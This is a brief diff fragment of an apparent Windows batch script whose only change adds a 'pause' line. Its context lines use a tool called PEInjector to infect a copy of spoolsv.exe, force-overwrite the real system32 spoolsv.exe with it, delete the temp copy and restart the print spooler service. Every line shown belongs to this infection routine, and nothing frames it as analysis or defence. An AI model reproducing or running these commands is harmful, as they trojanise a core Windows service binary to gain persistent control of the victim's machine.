@@ -6,3 +6,4 @@ PEInjector.exe --infect %TEMP%\spoolsv.exe
 echo f| xcopy %TEMP%\spoolsv.exe C:\windows\system32\spoolsv.exe /f
 del %TEMP%\spoolsv.exe
 sc start spooler
+pause
